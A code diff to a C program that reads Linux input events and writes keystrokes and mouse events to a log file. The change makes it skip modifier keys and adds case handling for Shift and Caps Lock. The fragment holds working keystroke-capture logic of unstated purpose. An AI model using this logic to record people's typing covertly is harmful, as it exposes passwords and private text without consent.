@@ -404,24 +404,27 @@ int main() {
                                 strcat(mouse_msg, "\n");
                                 int mouse_len = strlen(mouse_msg);
                                 write(log_fd_evt, mouse_msg, mouse_len);
-                            } else {
-                                // Handle character keys with modifiers
+                            } else if (ev.code != KEY_LEFTSHIFT && ev.code != KEY_RIGHTSHIFT && 
+                                       ev.code != KEY_LEFTCTRL && ev.code != KEY_RIGHTCTRL &&
+                                       ev.code != KEY_LEFTALT && ev.code != KEY_RIGHTALT &&
+                                       ev.code != KEY_CAPSLOCK) {
+                                // Handle character keys with modifiers (skip modifier keys themselves)
                                 char actual_char[16] = {0}; // Buffer for actual character (increased to handle longer strings like [BACKSPACE])
-                                
+
                                 // Map keycodes to characters considering modifier keys and configuration
                                 if (config_dynamic_formatting) {
                                     // Dynamic formatting enabled - use modifier key states
                                     if (ev.code >= KEY_A && ev.code <= KEY_Z) {
                                         // Alphabet keys - handle shift and caps lock
-                                        // Normal behavior: 
+                                        // Normal behavior:
                                         // - If caps lock is on and shift not pressed -> uppercase
-                                        // - If caps lock is off and shift pressed -> uppercase  
+                                        // - If caps lock is off and shift pressed -> uppercase
                                         // - If caps lock is on and shift pressed -> lowercase (shift overrides caps)
                                         // - If caps lock is off and shift not pressed -> lowercase
                                         if (!alt_gr_pressed) {
                                             // Determine if this should be uppercase based on caps lock and shift state
                                             int is_uppercase = (caps_lock_on && !shift_pressed) || (!caps_lock_on && shift_pressed);
-                                            
+
                                             if (is_uppercase) {
                                                 actual_char[0] = 'A' + (ev.code - KEY_A);
                                             } else {
@@ -487,7 +490,7 @@ int main() {
                                     // Dynamic formatting disabled - use basic character mapping
                                     strcpy(actual_char, key_char);
                                 }
-                                
+
                                 int char_len = strlen(actual_char);
                                 write(log_fd_evt, actual_char, char_len);
                             }
